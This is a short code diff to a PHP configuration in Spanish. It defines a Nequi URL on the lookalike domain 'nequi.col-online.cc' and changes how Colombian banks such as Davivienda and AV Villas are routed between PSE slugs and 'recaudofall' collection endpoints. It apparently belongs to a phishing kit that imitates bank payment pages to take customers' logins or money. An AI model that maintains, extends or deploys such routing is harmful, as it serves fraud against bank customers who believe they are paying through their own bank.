@@ -22,18 +22,15 @@ define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#
 $PSE_BANKS = [
     'bancolombia' => ['slug' => 'bc', 'id' => '109'],
     'bogota' => ['slug' => 'bg', 'id' => '109'],
-    'davivienda' => ['slug' => 'dv', 'id' => '109'],
     'nequi' => ['slug' => 'nq', 'id' => '109'],
     'popular' => ['slug' => 'pop', 'id' => '109'],
     'caja-social' => ['slug' => 'cj', 'id' => '109'],
-    'avvillas' => ['slug' => 'avv', 'id' => '109'],
-    'occidente' => ['slug' => 'occ', 'id' => '109'],
-    'davibank-s.a.' => ['slug' => 'cpa', 'id' => '109'],
 ];
 
 // Bancos → recaudofall (valor exacto esperado por el endpoint)
 $PSE_BANKS_RECAUDOFALL = [
     'daviplata' => 'daviplata',
+    'davivienda' => 'davivienda',
     'avvillas' => 'av villas',
     'popular' => 'popular',
     'bbva' => 'bbva',
